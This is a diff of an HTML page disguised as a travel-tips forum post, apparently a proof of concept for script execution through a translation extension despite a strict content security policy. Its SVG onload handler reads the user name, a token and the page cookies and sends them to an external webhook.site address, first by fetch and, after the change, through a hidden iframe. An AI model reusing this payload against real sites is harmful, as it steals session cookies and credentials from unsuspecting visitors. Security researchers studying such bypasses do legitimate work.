@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <title>Forum Post – Travel Tips</title>
-  <!-- CSP que bloquearia execução JS normalmente -->
   <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self';">
 
   <style>
@@ -34,20 +33,20 @@
     <div class="content">
       Here's a cool travel tip!<br><br>
 
-      <!-- Token simulado (como um JWT, CSRF token, etc.) -->
-      <div id="token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload.signature</div>
+      <div id="token">fake-jwt-token-abc123</div>
 
-      <!-- Payload SVG que executa JS via onload ao traduzir com a extensão -->
+      <!-- Payload que cria um iframe para exfiltrar dados -->
       <svg onload="
-        fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?' +
-          new URLSearchParams({
-            user: document.getElementById('user')?.innerText,
-            token: document.getElementById('token')?.innerText,
-            cookies: document.cookie || 'No cookies'
-          })
-        )
+        const u = document.getElementById('user')?.innerText;
+        const t = document.getElementById('token')?.innerText;
+        const c = document.cookie;
+        const url = 'https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?' +
+          'user=' + encodeURIComponent(u) + '&token=' + encodeURIComponent(t) + '&cookies=' + encodeURIComponent(c);
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
       ">
-        <!-- visualmente inofensivo -->
       </svg>
 
       <p>If you're visiting Italy, make sure to try the gelato! 🍦</p>
@@ -55,4 +54,3 @@
   </div>
 </body>
 </html>
-
